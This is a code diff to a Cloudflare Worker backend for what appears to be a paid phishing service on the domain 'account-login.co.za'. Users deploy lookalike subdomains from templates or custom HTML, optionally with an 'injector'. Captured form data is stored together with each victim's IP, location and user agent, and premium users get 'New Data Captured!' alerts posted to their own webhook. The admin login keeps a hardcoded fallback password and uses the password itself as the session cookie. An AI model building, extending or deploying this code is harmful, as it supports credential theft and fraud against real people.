@@ -3,7 +3,6 @@
  * LOCATION: Cloudflare Worker
  */
 
-const PASSWORD = "admin-secret-123";
 const COOKIE_NAME = "admin_session";
 const ROOT_DOMAIN = "account-login.co.za";
 
@@ -38,10 +37,10 @@ export default {
 
     if (isAdminPath) {
         if (url.pathname === '/admin/login' && request.method === 'POST') {
-            return respond(await handleLogin(request));
+            return respond(await handleLogin(request, env));
         }
 
-        const isAuth = await checkAuth(request);
+        const isAuth = await checkAuth(request, env);
         if (!isAuth) {
             return respond(new Response(JSON.stringify({ success: false, error: "Unauthorized" }), {
                 status: 401,
@@ -98,7 +97,7 @@ export default {
     }
 
     if (url.pathname === '/api/capture' && request.method === 'POST') {
-      return respond(await handleCaptureRequest(request, env));
+      return respond(await handleCaptureRequest(request, env, ctx));
     }
 
     if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
@@ -112,6 +111,12 @@ export default {
     // Payment Submission
     if (url.pathname === '/api/pay' && request.method === 'POST') {
         return respond(await handlePaymentSubmit(request, env));
+    }
+
+    // User Settings (Webhooks)
+    if (url.pathname === '/api/user/settings') {
+        if (request.method === 'POST') return respond(await handleSaveSettings(request, env));
+        if (request.method === 'GET') return respond(await handleGetSettings(request, env));
     }
 
     // --- 3. SUBDOMAIN ROUTING ---
@@ -177,7 +182,8 @@ async function getUser(env, code) {
             strikes: 0,
             status: 'active', // active, locked, banned
             created: Date.now(),
-            expiry: null
+            expiry: null,
+            webhookUrl: null
         };
     }
 
@@ -218,21 +224,23 @@ function handleOptions(request) {
     return new Response(null, { headers: headers });
 }
 
-async function checkAuth(request) {
+async function checkAuth(request, env) {
   const cookieHeader = request.headers.get('Cookie');
   if (!cookieHeader) return false;
-  return cookieHeader.includes(`${COOKIE_NAME}=${PASSWORD}`);
+  const pwd = env.ADMIN_PASSWORD || "admin-secret-123";
+  return cookieHeader.includes(`${COOKIE_NAME}=${pwd}`);
 }
 
-async function handleLogin(request) {
+async function handleLogin(request, env) {
     try {
         const formData = await request.formData();
         const password = formData.get('password');
-        if (password === PASSWORD) {
+        const pwd = env.ADMIN_PASSWORD || "admin-secret-123";
+        if (password === pwd) {
             return new Response(JSON.stringify({ success: true }), {
                 headers: {
                     'Content-Type': 'application/json',
-                    'Set-Cookie': `${COOKIE_NAME}=${PASSWORD}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
+                    'Set-Cookie': `${COOKIE_NAME}=${pwd}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
                 }
             });
         }
@@ -258,18 +266,58 @@ async function handleSaveRequest(request, env) {
   }
 }
 
-async function handleCaptureRequest(request, env) {
+async function handleCaptureRequest(request, env, ctx) {
   try {
+    const ip = request.headers.get('CF-Connecting-IP') || 'Unknown';
+    const allowed = await checkRateLimit(env, ip, 'capture', 60, 60); // 60 req/min
+    if (!allowed) return jsonError("Rate limit exceeded", 429);
+
     const body = await request.json();
     const timestamp = Date.now();
     const uuid = crypto.randomUUID();
     const uniqueCode = body.uniqueCode || 'default';
     const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;
 
-    await env.SUBDOMAINS.put(key, JSON.stringify({ timestamp, data: body }));
+    // Extract Intelligence Metadata
+    const cf = request.cf || {};
+    const meta = {
+        ip: ip,
+        country: cf.country || 'Unknown',
+        city: cf.city || 'Unknown',
+        asn: cf.asn || '',
+        userAgent: request.headers.get('User-Agent') || 'Unknown'
+    };
 
-    // Also track capture count for stats if we want (optional, but good for admin)
-    // For now we rely on listing keys.
+    const entry = { timestamp, data: body, meta };
+    await env.SUBDOMAINS.put(key, JSON.stringify(entry));
+
+    // Webhook Trigger (Async)
+    const user = await getUser(env, uniqueCode);
+    if (user.plan === 'premium' && user.webhookUrl) {
+        const payload = {
+            content: "🚨 **New Data Captured!**",
+            embeds: [{
+                title: "Capture Details",
+                fields: [
+                    { name: "Subdomain", value: body.url || "Unknown", inline: true },
+                    { name: "IP Address", value: meta.ip, inline: true },
+                    { name: "Location", value: `${meta.city}, ${meta.country}`, inline: true },
+                    { name: "User Agent", value: meta.userAgent }
+                ],
+                color: 16763907 // Gold
+            }]
+        };
+
+        if (ctx && ctx.waitUntil) {
+            ctx.waitUntil(
+                fetch(user.webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(err => console.error("Webhook Failed", err))
+            );
+        }
+    }
 
     return new Response(JSON.stringify({ success: true, key }), { headers: { 'Content-Type': 'application/json' } });
   } catch (err) {
@@ -320,15 +368,18 @@ async function handleGetSites(env) {
 
 async function handleGetPublicTemplates(env) {
     const list = await env.SUBDOMAINS.list({ prefix: "template::" });
-    const templates = list.keys.map(k => k.name.replace("template::", ""));
+    const templates = await Promise.all(list.keys.map(async k => {
+        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
+        return { name: k.name.replace("template::", ""), previewUrl: val.previewUrl };
+    }));
     return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
 }
 
 async function handleSaveTemplate(request, env) {
     const body = await request.json();
-    const { name, content, redirectUrl } = body;
+    const { name, content, redirectUrl, previewUrl } = body;
     if (!name || !content) return jsonError("Missing fields");
-    await env.SUBDOMAINS.put(`template::${name}`, JSON.stringify({ content, redirectUrl, updated: Date.now() }));
+    await env.SUBDOMAINS.put(`template::${name}`, JSON.stringify({ content, redirectUrl, previewUrl, updated: Date.now() }));
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
 }
 
@@ -345,14 +396,12 @@ async function handleDeleteSite(request, env) {
     const subdomain = url.searchParams.get('subdomain');
     if (!subdomain) return jsonError("Missing subdomain");
 
-    // Cleanup Code Map if needed (Admin deletion force)
     try {
         const siteData = await env.SUBDOMAINS.get(subdomain, { type: "json" });
         if (siteData && siteData.ownerCode) {
             const mapKey = `code_map::${siteData.ownerCode}`;
             const mapData = await env.SUBDOMAINS.get(mapKey, { type: "json" });
             if (mapData) {
-                // Handle Array or Object
                 let newSites = [];
                 if (Array.isArray(mapData.sites)) {
                     newSites = mapData.sites.filter(s => s.subdomain !== subdomain);
@@ -367,7 +416,7 @@ async function handleDeleteSite(request, env) {
                 }
             }
         }
-    } catch (e) {} // Ignore cleanup errors
+    } catch (e) {}
 
     await env.SUBDOMAINS.delete(subdomain);
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
@@ -375,13 +424,16 @@ async function handleDeleteSite(request, env) {
 
 async function handlePublicDeploy(request, env, rootDomain) {
     try {
+        const ip = request.headers.get('CF-Connecting-IP') || 'Unknown';
+        const allowed = await checkRateLimit(env, ip, 'deploy', 10, 3600); // 10 req/hour
+        if (!allowed) return jsonError("Rate limit exceeded. Try again later.", 429);
+
         const body = await request.json();
         let { subdomain, uniqueCode, templateName, customHtml, enableInjector, redirectUrl } = body;
 
         if (!subdomain || !uniqueCode) return jsonError("Missing subdomain or unique code");
         if (!/^[a-zA-Z0-9-]+$/.test(subdomain)) return jsonError("Invalid subdomain format");
 
-        // 1. Check User Plan & Limits
         const user = await getUser(env, uniqueCode);
 
         if (user.status === 'locked' || user.status === 'banned') {
@@ -391,13 +443,11 @@ async function handlePublicDeploy(request, env, rootDomain) {
         const mapKey = `code_map::${uniqueCode}`;
         let codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
 
-        // Normalize codeMap to object with sites array
         let currentSites = [];
         if (codeMap) {
             if (Array.isArray(codeMap.sites)) {
                 currentSites = codeMap.sites;
             } else if (codeMap.subdomain) {
-                // Legacy Format
                 currentSites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
             }
         }
@@ -410,21 +460,14 @@ async function handlePublicDeploy(request, env, rootDomain) {
              return jsonError(`Plan limit reached (${limit} sites). Delete a site to deploy a new one.`);
         }
 
-        // 2. Check Subdomain Availability
         const existingSub = await env.SUBDOMAINS.get(subdomain);
         if (existingSub) {
-            // Check if it belongs to this user (replacing own site?)
-            // If we just deleted it above, existingSub would still be found if we didn't wait?
-            // KV is eventually consistent, but delete usually immediate for same colo.
-            // However, to be safe, if we just decided to replace it, we are fine.
-            // But if it's someone ELSE'S subdomain...
             const siteJson = JSON.parse(existingSub);
             if (siteJson.ownerCode !== uniqueCode) {
                 return jsonError("Subdomain already taken");
             }
         }
 
-        // 3. Prepare Content
         let htmlContent = '';
         let shouldInject = false;
 
@@ -437,8 +480,6 @@ async function handlePublicDeploy(request, env, rootDomain) {
         } else if (customHtml) {
             htmlContent = customHtml;
             shouldInject = (enableInjector === true);
-            // redirectUrl is already extracted from the body.
-            // If it's undefined or empty, we set it to null to be safe.
             if (!redirectUrl) redirectUrl = null;
         } else {
             return jsonError("Must provide a template or custom HTML");
@@ -461,7 +502,6 @@ async function handlePublicDeploy(request, env, rootDomain) {
             }
         }
 
-        // 4. Save Site
         await env.SUBDOMAINS.put(subdomain, JSON.stringify({
             type: 'HTML',
             content: htmlContent,
@@ -470,7 +510,6 @@ async function handlePublicDeploy(request, env, rootDomain) {
             isInjected: shouldInject
         }));
 
-        // 5. Update Code Map
         currentSites.push({ subdomain, created: Date.now() });
         await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: currentSites }));
 
@@ -489,9 +528,7 @@ async function handleGetPublicCaptures(request, env) {
 
     const user = await getUser(env, code);
 
-    // Check if locked
     if (user.status === 'locked' || user.status === 'banned') {
-         // Return specialized error or just success:false with status
          return new Response(JSON.stringify({
              success: false,
              error: "Account Locked",
@@ -499,7 +536,6 @@ async function handleGetPublicCaptures(request, env) {
          }), { headers: { 'Content-Type': 'application/json' } });
     }
 
-    // Get Site Count & List
     const mapKey = `code_map::${code}`;
     const codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
     let siteCount = 0;
@@ -510,18 +546,15 @@ async function handleGetPublicCaptures(request, env) {
             sites = codeMap.sites;
             siteCount = sites.length;
         } else if (codeMap.subdomain) {
-            // Legacy
             sites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
             siteCount = 1;
         }
     }
 
     const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
-    // Sort latest first
     const keys = list.keys.reverse();
     const totalCount = keys.length;
 
-    // Apply Limits
     let limit = 5; // Free
     if (user.plan === 'basic') limit = 15;
     if (user.plan === 'premium') limit = 10000; // Unlimited
@@ -544,7 +577,8 @@ async function handleGetPublicCaptures(request, env) {
         expiry: user.expiry,
         lastPayment: user.lastPaymentDate,
         siteCount: siteCount,
-        sites: sites
+        sites: sites,
+        webhookUrl: user.webhookUrl // Include settings
     }), { headers: { 'Content-Type': 'application/json' } });
 }
 
@@ -555,7 +589,6 @@ async function handleDeletePublicSite(request, env) {
 
     if (!code || !subdomain) return jsonError("Missing fields");
 
-    // 1. Verify Ownership
     const mapKey = `code_map::${code}`;
     const codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
     let sites = [];
@@ -567,10 +600,8 @@ async function handleDeletePublicSite(request, env) {
     const ownsSite = sites.some(s => s.subdomain === subdomain);
     if (!ownsSite) return jsonError("Unauthorized: Site not found in your account", 403);
 
-    // 2. Delete Subdomain KV
     await env.SUBDOMAINS.delete(subdomain);
 
-    // 3. Update Code Map
     const newSites = sites.filter(s => s.subdomain !== subdomain);
     if (newSites.length > 0) {
         await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: newSites }));
@@ -611,24 +642,20 @@ async function handlePaymentSubmit(request, env) {
         const user = await getUser(env, uniqueCode);
         if (user.status === 'banned') return jsonError("Account is permanently banned.");
 
-        // Determine intended plan based on voucher (Logic? Or assume user selects?)
-        // Let's assume the user selects the plan they are paying for, OR imply it from voucher type?
-        // The prompt says "blue voucher..1voucher etc n they chose".
-        // Let's assume the body includes `targetPlan` or we infer.
-        // I will assume simple logic: 10r = Basic, 20r = Premium.
-        // But the voucher doesn't say the amount until checked.
-        // So I'll provisionally give Premium (or what they asked for).
-        // Let's require `plan` in the body.
+        const plan = body.plan || 'premium';
 
-        const plan = body.plan || 'premium'; // Default to premium if not specified
+        // Check for pending vouchers of same plan
+        const list = await env.SUBDOMAINS.list({ prefix: "voucher_queue::" });
+        for (const k of list.keys) {
+            const v = await env.SUBDOMAINS.get(k.name, { type: "json" });
+            if (v && v.uniqueCode === uniqueCode && v.status === 'pending' && v.plan === plan) {
+                return jsonError(`You already have a pending ${plan.toUpperCase()} voucher request. Please wait for approval.`);
+            }
+        }
 
-        // Update User to Provisional Plan
-        user.plan = plan; // Immediate access
-        // Do NOT update expiry yet (wait for admin)
-
+        user.plan = plan;
         await saveUser(env, uniqueCode, user);
 
-        // Add to Admin Queue
         const voucherId = crypto.randomUUID();
         const voucherData = {
             id: voucherId,
@@ -650,13 +677,53 @@ async function handlePaymentSubmit(request, env) {
     }
 }
 
+async function handleSaveSettings(request, env) {
+    try {
+        const body = await request.json();
+        const { uniqueCode, webhookUrl } = body;
+        if (!uniqueCode) return jsonError("Missing unique code");
+
+        const user = await getUser(env, uniqueCode);
+
+        if (user.plan !== 'premium' && webhookUrl) {
+             return jsonError("Webhooks are a Premium feature. Upgrade to Premium to use this.", 403);
+        }
+
+        if (webhookUrl) {
+            try {
+                new URL(webhookUrl);
+            } catch (e) {
+                return jsonError("Invalid Webhook URL");
+            }
+        }
+
+        user.webhookUrl = webhookUrl || null;
+        await saveUser(env, uniqueCode, user);
+
+        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
+    } catch (e) {
+        return jsonError(e.message, 500);
+    }
+}
+
+async function handleGetSettings(request, env) {
+    const url = new URL(request.url);
+    const code = url.searchParams.get('code');
+    if (!code) return jsonError("Missing code");
+
+    const user = await getUser(env, code);
+    return new Response(JSON.stringify({
+        success: true,
+        webhookUrl: user.webhookUrl || ""
+    }), { headers: { 'Content-Type': 'application/json' } });
+}
+
 async function handleGetVouchers(env) {
     const list = await env.SUBDOMAINS.list({ prefix: "voucher_queue::" });
     const vouchers = await Promise.all(list.keys.map(async k => {
         const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
         return val;
     }));
-    // Filter only pending?
     const pending = vouchers.filter(v => v.status === 'pending');
     return new Response(JSON.stringify({ success: true, data: pending }), { headers: { 'Content-Type': 'application/json' } });
 }
@@ -664,7 +731,7 @@ async function handleGetVouchers(env) {
 async function handleVoucherAction(request, env) {
     try {
         const body = await request.json();
-        const { voucherId, action, reason } = body; // action: 'approve' | 'decline'
+        const { voucherId, action, reason } = body;
 
         const voucherKey = `voucher_queue::${voucherId}`;
         const voucher = await env.SUBDOMAINS.get(voucherKey, { type: "json" });
@@ -673,22 +740,19 @@ async function handleVoucherAction(request, env) {
         const user = await getUser(env, voucher.uniqueCode);
 
         if (action === 'approve') {
-            // Solidify Plan
             const now = Date.now();
             let currentExpiry = user.expiry || now;
-            if (currentExpiry < now) currentExpiry = now; // If expired, start from now
+            if (currentExpiry < now) currentExpiry = now;
 
-            user.expiry = currentExpiry + (30 * 24 * 60 * 60 * 1000); // Add 30 Days (Stackable)
+            user.expiry = currentExpiry + (30 * 24 * 60 * 60 * 1000);
             user.lastPaymentDate = now;
-            user.status = 'active'; // Ensure active
+            user.status = 'active';
 
-            // Delete from queue
             await env.SUBDOMAINS.delete(voucherKey);
 
         } else if (action === 'decline') {
-            // Revert Plan
             user.plan = 'free';
-            user.status = 'locked'; // "Serious Red Warning"
+            user.status = 'locked';
             user.strikes = (user.strikes || 0) + 1;
             user.lockReason = reason || "Invalid Voucher";
 
@@ -708,7 +772,6 @@ async function handleVoucherAction(request, env) {
 }
 
 async function handleGetUsers(env) {
-    // This is expensive if many users. For now, we list `user::` prefix.
     const list = await env.SUBDOMAINS.list({ prefix: "user::" });
     const users = await Promise.all(list.keys.map(async k => {
         const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
@@ -719,4 +782,20 @@ async function handleGetUsers(env) {
 
 function jsonError(msg, status = 400) {
     return new Response(JSON.stringify({ success: false, error: msg }), { status: status, headers: { 'Content-Type': 'application/json' } });
+}
+
+async function checkRateLimit(env, ip, action, limit, windowSeconds) {
+    try {
+        const key = `ratelimit::${action}::${ip}`;
+        const countStr = await env.SUBDOMAINS.get(key);
+        const count = countStr ? parseInt(countStr) : 0;
+
+        if (count >= limit) return false;
+
+        const newCount = count + 1;
+        await env.SUBDOMAINS.put(key, newCount.toString(), { expirationTtl: windowSeconds });
+        return true;
+    } catch(e) {
+        return true; // Fail open if KV error
+    }
 }
